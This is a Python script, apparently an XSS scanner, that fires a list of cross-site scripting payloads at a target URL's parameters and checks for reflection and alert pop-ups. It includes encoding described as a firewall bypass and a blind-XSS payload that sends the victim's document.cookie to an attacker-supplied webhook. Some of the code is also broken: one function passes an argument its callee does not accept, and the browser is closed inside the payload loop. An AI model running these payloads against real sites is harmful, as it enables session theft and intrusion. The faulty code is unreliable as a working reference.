import requests
import argparse
import base64
import time
import json
import csv
import threading
from urllib.parse import urlparse, parse_qs, quote
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException

# Extended list of XSS payloads
PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<body/onload=alert("XSS")>',
    '"><img src=x onerror=alert(1)>',
    '{{7*7}}',  # Template injection
    '${alert(1)}',  # JavaScript template literals
    '"><iframe src="javascript:alert(1)">',
    '"><svg/onload=alert(1)>',
    '<script>/*%00*/alert(1)</script>',  # Null byte injection
    '<svg><script>alert(1)</script></svg>',  # Nested tags
    '<img/src="x"/onerror=alert(1)>',  # Obfuscated attributes
]

# Function to encode payloads for WAF bypass
def encode_payloads(payload):
    return {
        'plain': payload,
        'url_encoded': quote(payload),
        'base64_encoded': base64.b64encode(payload.encode()).decode()
    }

# Function to set up Selenium for DOM-based XSS detection
def setup_selenium():
    options = Options()
    options.add_argument("--headless")  # Run without UI
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    return webdriver.Chrome(options=options)

# Function to test for DOM-based XSS using Selenium
def test_dom_xss(url, param):
    driver = setup_selenium()
    vulnerabilities = []
    for payload in PAYLOADS:
        try:
            full_url = f"{url}?{param}={quote(payload)}"
            driver.get(full_url)
            time.sleep(2)  # Allow JS execution

            # Check for alert pop-ups
            try:
                alert = driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                if "XSS" in alert_text:
                    print(f"[!] DOM XSS Detected in {param} with payload: {payload}")
                    vulnerabilities.append({
                        'parameter': param,
                        'payload': payload,
                        'method': 'DOM',
                        'response_length': len(driver.page_source)
                    })
            except NoAlertPresentException:
                pass

        except Exception as e:
            print(f"[ERROR] Selenium failed: {str(e)}")
        finally:
            driver.quit()
    return vulnerabilities

# Function to test for reflected XSS
def test_xss(url, params, method='GET', cookies=None, data_format='query', verbose=False):
    vulnerabilities = []
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (XSS Scanner)'}
    
    if cookies:
        headers['Cookie'] = cookies

    def scan_param(payload, param):
        enc_payloads = encode_payloads(payload)
        test_data = {param: enc_payloads['plain']}  # Using plain first

        try:
            if method.upper() == 'GET':
                response = session.get(url, params=test_data, headers=headers, timeout=5)
            elif method.upper() == 'POST':
                if data_format == 'json':
                    response = session.post(url, json=test_data, headers=headers, timeout=5)
                elif data_format == 'xml':
                    xml_data = f"<{param}>{payload}</{param}>"
                    response = session.post(url, data=xml_data, headers={'Content-Type': 'application/xml'}, timeout=5)
                else:
                    response = session.post(url, data=test_data, headers=headers, timeout=5)

            if any(enc_payload in response.text for enc_payload in enc_payloads.values()):
                vulnerabilities.append({
                    'parameter': param,
                    'payload': payload,
                    'method': method.upper(),
                    'encoding': 'plain',
                    'response_length': len(response.text)
                })
                print(f"[!] Reflected XSS in {param} with payload: {payload}")
                if verbose:
                    print(f"[DEBUG] Request: {response.request.url}")
                    print(f"[DEBUG] Response: {response.text[:500]}...")  # Truncate for readability

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Testing {param} with {payload} failed: {str(e)}")

    # Multithreading for faster testing
    threads = []
    for payload in PAYLOADS:
        for param in params:
            thread = threading.Thread(target=scan_param, args=(payload, param))
            thread.start()
            threads.append(thread)
            time.sleep(0.5)  # Rate limiting to avoid overwhelming the server

    for thread in threads:
        thread.join()  # Wait for all threads to complete

    return vulnerabilities

# Function to test blind XSS via webhook
def test_blind_xss(url, params, webhook_url, method='GET'):
    print("[*] Testing for Blind XSS (may take time to trigger)...")
    blind_payload = f'<script>setTimeout(() => fetch("{webhook_url}?data="+document.cookie), 5000)</script>'
    return test_xss(url, params, method, payloads=[blind_payload])

# Function to perform full XSS scan
def xss_scan(url, params, method='GET', cookies=None, data_format='query', webhook=None, output_file=None, verbose=False):
    print(f"[*] Scanning {url} using {method.upper()} method...")

    results = test_xss(url, params, method, cookies, data_format, verbose)

    for param in params:
        dom_results = test_dom_xss(url, param)
        results.extend(dom_results)

    if webhook:
        blind_results = test_blind_xss(url, params, webhook, method)
        results.extend(blind_results)

    if output_file:
        export_results(results, output_file)

    return results

# Function to export results to JSON or CSV
def export_results(results, output_file):
    if output_file.endswith(".json"):
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"[+] Results saved to {output_file}")
    elif output_file.endswith(".csv"):
        keys = results[0].keys() if results else []
        with open(output_file, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            writer.writerows(results)
        print(f"[+] Results saved to {output_file}")
    else:
        print("[ERROR] Unsupported file format! Use .json or .csv")

# Main function for argument handling
def main():
    parser = argparse.ArgumentParser(description="Advanced XSS Scanner")
    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-p', '--params', required=True, nargs='+', help="Parameters to test")
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help="HTTP method")
    parser.add_argument('-c', '--cookies', help="Cookies for authentication")
    parser.add_argument('-f', '--format', default='query', choices=['query', 'json', 'xml'], help="Data format for POST requests")
    parser.add_argument('-w', '--webhook', help="Webhook URL for Blind XSS testing")
    parser.add_argument('-o', '--output', help="Output file (JSON or CSV)")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output")

    args = parser.parse_args()

    vulnerabilities = xss_scan(args.url, args.params, args.method, args.cookies, args.format, args.webhook, args.output, args.verbose)

    if vulnerabilities:
        print("\n[+] XSS Vulnerabilities Found:")
        for vuln in vulnerabilities:
            print(f" - Parameter: {vuln['parameter']} | Method: {vuln['method']} | Encoding: {vuln.get('encoding', 'N/A')}")
    else:
        print("\n[-] No XSS vulnerabilities detected.")

if __name__ == '__main__':
    main()